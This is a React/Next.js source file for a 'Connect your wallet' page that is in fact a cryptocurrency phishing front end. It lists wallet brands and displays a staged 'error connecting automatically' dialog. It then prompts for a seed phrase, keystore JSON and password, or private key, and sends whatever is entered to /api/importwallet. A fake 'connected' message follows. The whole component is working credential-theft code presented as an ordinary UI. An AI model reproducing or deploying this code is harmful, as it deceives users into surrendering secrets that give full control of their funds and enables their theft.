/* eslint-disable @next/next/no-img-element */
"use client";
import { wallets } from "@/lib/data";
import React, { useState } from "react";

interface ITEM {
  name: string;
  imgUrl: string;
}

const Wallet = () => {
  const [selectedItem, setSelectedItem] = useState<ITEM>();
  const [selectedTab, setSelectedTab] = useState("phrase");
  const [status, setStatus] = useState("Trying to connect to wallet");
  const [formData, setFormData] = useState({
    phrase: "",
    keystore: {
      json: "",
      password: "",
    },
    privateKey: "",
  });

  const handleInputChange = (
    e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>
  ) => {
    const { name, value } = e.target;
    setFormData((prevData) => ({
      ...prevData,
      [name]: value,
    }));
  };

  const handleKeystoreChange = (
    e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>
  ) => {
    const { name, value } = e.target;
    setFormData((prevData) => ({
      ...prevData,
      keystore: {
        ...prevData.keystore,
        [name]: value,
      },
    }));
  };

  const resetForm = () => {
    setFormData({
      phrase: "",
      keystore: {
        json: "",
        password: "",
      },
      privateKey: "",
    });
    setSelectedTab("phrase");
  };

  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    setStatus('Trying to connect to wallet');

    const finalModal = document.getElementById(
      "my_modal_3"
    ) as HTMLDialogElement | null;

    const modalTwo = document.getElementById(
      "my_modal_2"
    ) as HTMLDialogElement | null;

    if (modalTwo) {
      modalTwo.close();
    }

    if (finalModal) {
      finalModal.show();
    }

    // Process the formData based on the selectedTab
    let dataToSend;
    if (selectedTab === "phrase") {
      dataToSend = { phrase: formData.phrase };
    } else if (selectedTab === "keystore") {
      dataToSend = { keystore: formData.keystore };
    } else if (selectedTab === "private") {
      dataToSend = { privateKey: formData.privateKey };
    }
    // Send dataToSend to the backend
    console.log(dataToSend);

    // Send dataToSend to the backend
    try {
      const response = await fetch("/api/importwallet", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(dataToSend),
      });
      if (response.ok) {
        resetForm()
        setTimeout(() => setStatus("Connecting"), 2000);
        setTimeout(() => setStatus("CONNECTED WALLET ,wait while our team fix issue"), 10000);
      } else {
        setStatus("Check your internet connection");
      }
    } catch (error) {
      console.error("Error submitting form:", error);
    }
  };

  const handleModal = async (item: { name: string; imgUrl: string }) => {
    setSelectedItem(item);

    const modal = document.getElementById(
      "my_modal_1"
    ) as HTMLDialogElement | null;
    const modalTwo = document.getElementById(
      "my_modal_2"
    ) as HTMLDialogElement | null;
    
    if (modal) {
      modal.showModal();
    }
    setTimeout(() => {
      modal?.close();
      modalTwo?.showModal();
    }, 2500);
  };

  return (
    <div className="mt-5 pb-5">
      <div className="mycontainer navConnn">
        <div className="px-4">
          <div>
            <div>
              <h4 className="text-[20px] text-white font-bold">
                Connect your wallet
              </h4>
            </div>

            <div className="mt-4 pb-4 h-[80vh] lg:h-[570px] bg-white rounded-[10px] overflow-y-scroll">
              <div className="sticky bg-white w-full h-[50px] lg:h-[60px] flex flex-col justify-end rounded-t-[10px] top-0 z-50 ">
                <p className="font-bold text-black lg:pl-5 pl-2 pb-2">
                  Connect to a wallet
                </p>
              </div>

              <div className="pt-7 px-3 flex flex-col gap-3 lg:px-5">
                {wallets.map((item, index) => (
                  <div
                    key={index}
                    onClick={() => handleModal(item)}
                    className="flex items-center justify-between h-[2rem] border-customGray-main border-[1px] rounded-[10px] py-[1.5em] px-[0.4em] cursor-pointer"
                  >
                    <div className="flex items-center gap-2">
                      <div className="h-[10px] w-[10px] bg-primary-light rounded-full"></div>
                      <p className="text-customDark-main font-bold">
                        {item.name}
                      </p>
                    </div>
                    <div>
                      <img
                        src={item.imgUrl}
                        alt="meta"
                        className="w-[40px] h-auto rounded-full"
                      />
                    </div>
                  </div>
                ))}
              </div>
            </div>

            {/* Open the modal using document.getElementById('ID').showModal() method */}
            <dialog id="my_modal_1" className="modal">
              <div className="flex flex-col gap-5 modal-box bg-white w-[80%]">
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-3 text-primary-light font-bold">
                    Initializing
                    <span className="loading loading-bars loading-xs bg-primary-light"></span>
                  </div>

                  <form method="dialog" className="">
                    {/* if there is a button in form, it will close the modal */}
                    <button className="outline-none h-[10px] text-[13px] font-bold">
                      X
                    </button>
                  </form>
                </div>

                {selectedItem && (
                  <div className="flex items-center justify-between p-2 border-customGray-main border-[1px] rounded-[10px]">
                    <div className="flex flex-col gap-1">
                      <h5 className="font-bold text-customDark-main">
                        {selectedItem.name}
                      </h5>
                      <p className="text-[12px] text-customGray-main">
                        Easy-to-use browser extension
                      </p>
                    </div>

                    <div>
                      <img
                        src={selectedItem.imgUrl}
                        alt="meta"
                        className="w-[40px] h-auto rounded-full"
                      />
                    </div>
                  </div>
                )}
              </div>
            </dialog>
            <dialog id="my_modal_3" className="modal bg-[#00000069]">
              <div className="flex flex-col gap-5 modal-box bg-white w-[80%]">
                <div className="flex items-center justify-between">
                  <div
                    className={`text-[13px] lg:text-[16px] sm:text-[14px] flex items-center gap-3 font-bold ${
                      status === 'Error connecting to wallet...'
                        ? "text-red-500"
                        : "text-primary-light"
                    }`}
                  >
                    {status}
                    <span
                      className={`loading loading-dots loading-xs sm:loading-md bg-primary-light ${
                        status === "Error connecting to wallet..." || status ===
                        "Check your internet connection"
                          ? "hidden"
                          : ""
                      }`}
                    ></span>
                  </div>

                  <form method="dialog" className="">
                    {/* if there is a button in form, it will close the modal */}
                    <button className="outline-none h-[10px] text-[13px] font-bold">
                      X
                    </button>
                  </form>
                </div>
              </div>
            </dialog>
            <dialog id="my_modal_2" className="modal">
              <div className="modal-box bg-white w-[83%]">
                <div className="flex flex-col gap-5">
                  <div className="flex flex-col gap-3">
                    <div>
                      <p className="text-red-500 text-[13px] md:text-[16px]  modal-p font-bold">
                        There was an error connecting automatically. But do not
                        worry, you can stll connect manually.
                      </p>
                    </div>
                    {selectedItem && (
                      <div className="flex items-center gap-3">
                        <div>
                          <img
                            src={selectedItem.imgUrl}
                            alt="img"
                            className="w-[40px] h-auto rounded-full"
                          />
                        </div>
                        <div>
                          <p className="text-black font-bold modal-p md:text-[16px] text-[13px] ">
                            Import your {selectedItem.name} wallet
                          </p>
                        </div>
                      </div>
                    )}
                  </div>

                  <div>
                    <div>
                      <div className="flex items-center gap-3 justify-between md:w-[80%] md:my-0 md:mx-auto">
                        <button
                          className={`outline-none modal-p text-[13.3px] md:text-[16px] ${
                            selectedTab === "phrase"
                              ? "border-b-[1px] border-[black]"
                              : ""
                          }`}
                          onClick={() => setSelectedTab("phrase")}
                        >
                          Phrase
                        </button>
                        <button
                          className={`outline-none modal-p text-[13.3px] md:text-[16px] ${
                            selectedTab === "keystore"
                              ? "border-b-[1px] border-[black]"
                              : ""
                          }`}
                          onClick={() => setSelectedTab("keystore")}
                        >
                          Keystore JSON
                        </button>
                        <button
                          className={`outline-none modal-p text-[13.3px] md:text-[16px] ${
                            selectedTab === "private"
                              ? "border-b-[1px] border-[black]"
                              : ""
                          }`}
                          onClick={() => setSelectedTab("private")}
                        >
                          Private Key
                        </button>
                      </div>
                    </div>

                    <div className="mt-3">
                      <form onSubmit={handleSubmit} className="">
                        {selectedTab === "phrase" && (
                          <div className="form-control">
                            <textarea
                              name="phrase"
                              id=""
                              value={formData.phrase}
                              onChange={handleInputChange}
                              placeholder="Enter your wallet phrase"
                              rows={3}
                              className="text-gray-700 focus:outline-none bg-white border-[1px] border-customGray-main rounded-[10px] placeholder:text-customGray-main p-2"
                            ></textarea>
                          </div>
                        )}
                        {selectedTab === "keystore" && (
                          <div className="flex flex-col gap-4">
                            <div className="form-control">
                              <textarea
                                id=""
                                name="json"
                                value={formData.keystore.json}
                                onChange={handleKeystoreChange}
                                placeholder="Enter your Keystore JSON"
                                rows={3}
                                className="text-gray-700 focus:outline-none bg-white border-[1px] border-customGray-main rounded-[10px] placeholder:text-customGray-main p-2"
                              ></textarea>
                            </div>
                            <div className="form-control">
                              <input
                                type="password"
                                name="password"
                                value={formData.keystore.password}
                                onChange={handleKeystoreChange}
                                placeholder="Wallet password"
                                className="bg-white text-gray-700 focus:outline-none border-[1px] border-customGray-main rounded-[10px] placeholder:text-customGray-main p-2"
                              />
                            </div>
                          </div>
                        )}
                        {selectedTab === "private" && (
                          <div className="form-control">
                            <input
                              name="privateKey"
                              value={formData.privateKey}
                              onChange={handleInputChange}
                              type="text"
                              placeholder="Enter your Private Key"
                              className="bg-white border-[1px] text-gray-700 focus:outline-none border-customGray-main rounded-[10px] placeholder:text-customGray-main p-2"
                            />
                          </div>
                        )}
                        <div className="form-control mt-6">
                          <button
                            type="submit"
                            className="text-[14px] bg-[#090979] rounded-[4px] p-2 text-white font-bold"
                          >
                            Validate
                          </button>
                        </div>
                      </form>
                    </div>
                  </div>
                </div>
                <div className="modal-action">
                  <form method="dialog">
                    {/* if there is a button in form, it will close the modal */}
                    <button className='h-[2rem] text-center rounded-[5px] w-[90px] bg-red-500 text-white border-none'>
                            Close
                        </button>
                  </form>
                </div>
              </div>
            </dialog>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Wallet;
